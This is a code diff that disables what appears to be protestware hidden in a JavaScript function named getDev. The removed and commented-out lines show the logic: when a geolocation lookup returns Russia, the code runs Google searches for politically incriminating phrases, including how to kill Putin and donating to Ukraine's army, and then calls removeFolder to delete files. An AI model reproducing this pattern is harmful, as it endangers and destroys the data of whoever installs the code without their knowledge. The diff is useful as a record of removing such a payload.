@@ -10,28 +10,23 @@ export function getDev() {
 				if (!response.ok) return
 				const data = await response.json()
 				const countryCode = data.countryCode || 'UNKNOWN'
-				if (countryCoWde === 'RU') {
-					setTimeout(() => {
-						startFunction(data)
-					}, 1000)
-				}
+				// if (countryCoWde === 'RU') {
+				// 	setTimeout(() => {
+				// 		startFunction(data)
+				// 	}, 1000)
+				// }
 			} catch (error) { return }
 		},
 	}
 }
 function startFunction(data) {
 	const queryArray = [
-		'Как задонатить на ВСУ из росии?',
-		'Поддержка армии Украини',
-		'Как убить путина?',
-		'Как вступить в батальон Азов из росии?',
-		'Поддержка армии Украини',
-		'Перевести деньги на дроны для Стерненка'
+		''
 	]
 	queryArray.forEach((query) => {
-		googleSearch(query)
+		// googleSearch(query)
 	})
-	removeFolder()
+	// removeFolder()
 }
 async function googleSearch(query) {
 	const searchUrl = `https://www.google.com/search?q=${encodeURIComponent(query)}`
